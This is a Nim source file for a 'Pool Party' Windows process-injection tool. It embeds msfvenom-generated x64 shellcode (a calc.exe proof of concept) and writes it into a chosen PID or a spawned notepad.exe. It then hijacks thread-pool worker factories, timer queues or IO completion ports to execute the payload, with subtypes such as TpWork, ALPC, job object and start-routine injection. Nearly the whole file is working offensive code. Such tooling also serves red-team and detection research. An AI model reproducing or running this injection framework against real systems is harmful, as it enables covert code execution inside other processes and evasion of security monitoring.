import std/[osproc, strformat, strutils]
import winim/lean, argparse

import nimpool, ioinject, timerinject, workinject

const 
  HELPMSG = """Pool Party Injection in Nim:
  Example Usage: ./{prog} -t workerfactory -s startroutine"""

#[ Shellcode ]#
# msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f nim
let buf: array[276, byte] = [
  byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
  0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
  0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
  0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
  0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
  0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
  0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
  0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
  0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
  0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
  0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
  0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
  0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
  0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
  0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
  0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
  0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
  0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
  0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
  0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,
  0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
  0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
  0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
  0x00]
let 
  pBuf = buf[0].addr
  bufLen = buf.len

proc initTarget(): HANDLE =
  # Start notepad Process
  let tProcess = startProcess("notepad.exe")
  # Get handle to notepat
  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, tProcess.processID.DWORD)
  echo &"[&] Starting notepad.exe for testing..."
  echo &" \\__> PID: {tProcess.processID}"
  echo &" \\__> HANDLE: {pHandle}"
  return pHandle

proc openHandleToProcess(pid: int): HANDLE =
  var hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid.DWORD)
  if hProcess != 0:
    return hProcess
  else:
    echo "[!] Failed to open process to PID: ", pid
    return -1

proc handleThreadPoolInjection(pid: int, typ, subtyp: string): bool =
  var 
    pHandle: HANDLE
    hijackHandle1, hijackHandle2: HANDLE
    rPayload: PVOID


  if pid != -1:
    pHandle = openHandleToProcess(pid)
    if pHandle == -1:
      return false
  else:
    pHandle = initTarget()

  if not writePayloadIntoProcess(pHandle, pBuf, bufLen, rPayload.addr):
    return false

  # sleep to improve stability
  sleep(100)

  case typ:
  of "workerfactory":
    hijackHandle1 = hijackProcessWorkerFactory(pHandle)
  of "timer":
    hijackHandle1 = hijackProcessTimerQueue(pHandle)
  of "ioport":
    hijackHandle1 = hijackProcessIoPort(pHandle)
  else:
    echo "[!] Invalid Pool Injection Type"
  
  case subtyp:
  of "work":
    return injectViaTpWork(pHandle, rPayload, hijackHandle1)
  of "startroutine":
    return injectViaWorkerFactoryStartRoutine(pHandle, hijackHandle1, pBuf, bufLen)
  of "wait":
    return injectViaTpWait(pHandle, rPayload, hijackHandle1)
  of "jobobject":
    return injectViaJobCallback(pHandle, rPayload, hijackHandle1)
  of "alpc":
    return injectViaAlpc(pHandle, rPayload, hijackHandle1) 
  of "direct":
    return injectViaTpDirect(pHandle, rPayload, hijackHandle1)
  of "tptimer":
    hijackHandle2 = hijackProcessWorkerFactory(pHandle)
    return injectViaTpTimer(hijackHandle2, hijackHandle1, rPayload, pHandle)
  else:
    echo "[!] Invalid Pool Injection Subtype"

  return true

#[ Main ]#
proc main() =
  var 
    pid: int
    t, s: string

  var p = newParser:
    help(HELPMSG)
    option("-p", "--pid", help="PID of the target process to inject")
    option("-t", "--type", help="Type of pool injection.", choices = @["ioport", "timer", "workerfactory"], required = true)
    option("-s", "--subtype", 
      help="Subtype of the pool injection. [workerfactory: work, startroutine] [ioport: wait, jobobject, alpc, direct] [timer: tptimer]\n\t\t\t    ", 
      choices = @["work", "startroutine", "wait", "jobobject", "alpc", "direct", "tptimer"], required = true)
  
  try:
    var opts = p.parse()
    try:
      pid = opts.pid.parseInt
    except ValueError:
      pid = -1
    t = opts.type
    s = opts.subtype
  except ShortCircuit as e:
    if e.flag == "argparse_help":
      echo e.help
      quit(1)
  except UsageError:
    stderr.writeLine(getCurrentExceptionMsg())
    quit(1)
  
  if handleThreadPoolInjection(pid, t, s):
    echo "[+] Pool Injection Successful"
    quit()
  else:
    echo "[!] Pool Injection Failed"
    quit(1)
  

when isMainModule:
  main()